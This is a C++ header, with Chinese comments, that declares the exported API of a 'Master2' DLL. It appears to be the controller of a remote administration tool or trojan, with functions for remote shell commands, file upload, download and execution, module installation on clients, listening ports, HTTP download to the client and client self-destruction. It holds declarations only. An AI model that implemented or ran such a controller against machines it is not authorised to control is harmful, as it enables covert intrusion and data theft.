#pragma once
// 下列 ifdef 块是创建使从 DLL 导出更简单的
// 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 MASTER_EXPORTS
// 符号编译的。在使用此 DLL 的
// 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将
// MASTER2_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的
// 符号视为是被导出的。
#ifdef MASTER2_EXPORTS
#define MASTER2_API extern "C" __declspec(dllexport)
#else
#define MASTER2_API extern "C" __declspec(dllimport)
#endif

#include "ArrayData.h"
#include "BaseType.h"
#include "ClientInfoCallbacks.h"
#include "MessageDefines.h"
#include "CommCallback.h"
#include "CmdShellData.h"
#include "MasterError.h"
#include "FileTransferData.h"


typedef struct  
{
	CHAR	partition;
	UINT	driverType;
	UINT64	freeBytes;
	UINT64	totalBytes;
} MDISK_INFO;
typedef ItemList<MDISK_INFO, NO_UNINIT> MDiskInfoList;

typedef struct MFILE_INFO
{
	WCHAR		filename[MAX_PATH];
	DWORD		dwAttributes;
	UINT64		filesize;
	FILETIME	lastWriteTime;

	BOOL IsDir() const
	{
		return (FILE_ATTRIBUTE_DIRECTORY & dwAttributes);
	}

	bool operator<(const MFILE_INFO& another) const
	{
		if (! IsDir() && another.IsDir()) return false;
		else if (IsDir() && ! another.IsDir()) return true;
		else
		{
			int iCmp = _wcsicmp(filename, another.filename);
			if (iCmp < 0) return true;
			else return false;
		}
	}
} MFILE_INFO;
typedef ItemList<MFILE_INFO, NO_UNINIT> MFileInfoList;

typedef std::map<std::string,int> PORT_MAP;
//消息传输信息
typedef struct  
{
	MSGSERIALID serial;
	BOOL		bToClient;
	TCHAR		desc[1024];
} RC_MSG_INFO;
typedef ItemList<RC_MSG_INFO, NO_UNINIT> RcMsgInfoList;

typedef ItemList<TRANS_STATUS, NO_UNINIT> TransferInfoList;
//Shell相关接口
MASTER2_API BOOL OpenShell(LPCWSTR clientid, FnRemoteCmdOutput fnRemoteCmdOutput, LPVOID lpParameter);

MASTER2_API BOOL ExecuteShellCommand(LPCWSTR clientid, LPCWSTR cmdline, BOOL bAddRN = TRUE);

MASTER2_API void CloseShell(LPCWSTR clientid);

//文件管理相关接口

MASTER2_API BOOL PutFileToClient(LPCTSTR clientid,LPCTSTR serverpath,LPCTSTR clientpath);

MASTER2_API BOOL GetFileToServer(LPCTSTR clientid,LPCTSTR clientpath,LPCTSTR serverpath);

MASTER2_API BOOL StopFileTransfer(LPCTSTR clientid,LPCTSTR serverpath);

MASTER2_API BOOL StartFileTransfer(LPCTSTR clientid,LPCTSTR serverpath);


typedef void (*FnQueryTrans)(LPCTSTR clientid,TRANS_STATUS status,LPVOID lpParameter);
MASTER2_API void QueryFileTransferStatus(LPCTSTR clientid,TransferInfoList* list);
MASTER2_API void QueryTransferStatus(LPCTSTR clientid,FnQueryTrans fn,LPVOID lpParameter);

MASTER2_API void DeleteRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);

MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);

//文件浏览相关接口

MASTER2_API BOOL ListDisks(LPCWSTR clientid, MDiskInfoList* pDiskInfoList);

MASTER2_API BOOL ListFiles(LPCWSTR clientid, LPCWSTR findstr, MFileInfoList* pFileInfoList);

MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, LPVOID lpParameter);

MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, LPVOID lpParameter );

//启动Master
MASTER2_API BOOL StartMasterWorking();

//根据消息序列号，查询客户端的应答消息
MASTER2_API BOOL GetReplyByMsgserialid(LPCTSTR clientid, MSGSERIALID sendMsgserialid, ByteList* pByteList);

//查询正在发送消息的状态
MASTER2_API BOOL QuerySendingMessageStatus(LPCTSTR clientid, MSGSERIALID sendMsgserialid, DWORD* pdwSentBytes, DWORD* pdwTotalBytes);

//查询正在接受消息的状态
MASTER2_API BOOL QueryReceivingFileStatus(LPCTSTR clientid, MSGSERIALID receivingMsgserialid, DWORD* pdwRecvBytes, DWORD* pdwTotalBytes);

//设置客户端信息变更回调通知函数
MASTER2_API void SetClientInfoNotifies(FnNotifyProc fnNotify, LPVOID lpParameter);

//获取最近的一条错误编号
MASTER2_API DWORD GetMasterLastError();

//获取错误编号对应的描述信息
MASTER2_API LPCTSTR GetMasterErrorMsg(DWORD dwLastError);

//查询当前可用的客户端id列表
MASTER2_API void ListAvailableClients(MyStringList* pClientidList);

//查询客户端中可用的模块列表
MASTER2_API BOOL ListModules(LPCTSTR clientid, MyStringList* pModulenameList);

//向客户端中安装模块
MASTER2_API BOOL InstallClientModule(LPCTSTR clientid, LPCTSTR moduleName);

//添加监听服务
MASTER2_API int AddCommService(int port,int name);

//删除监听服务
MASTER2_API BOOL DeleteCommService(int serialid);

//查询服务端上可用的模块列表
MASTER2_API void ListAvailableClientModules(MyStringList* pModulenameList);

//让客户端自毁
MASTER2_API BOOL MakeClientSelfDestruction(LPCTSTR clientid);

//获取客户端的基础信息
MASTER2_API BOOL GetClientInfo(LPCTSTR clientid, CLIENT_INFO* clientBaseInfo);

//查询模块在客户端的状态和安装进度
MASTER2_API void QueryModuleInstallStatus(LPCTSTR clientid, LPCTSTR moduleName, MODULE_INST_STATUS* pStatus, UINT* pProgress);

//关闭MASTER
MASTER2_API void StopMasterWorking();

//修改Packet状态
MASTER2_API BOOL ModifyPacketStatus(ULONG serial,LPCTSTR clientid,BOOL status);

//设置模块回调
MASTER2_API void SetModuleCallBack(FnModuleNotifyProc func);

//使用HTTP下载文件
MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path);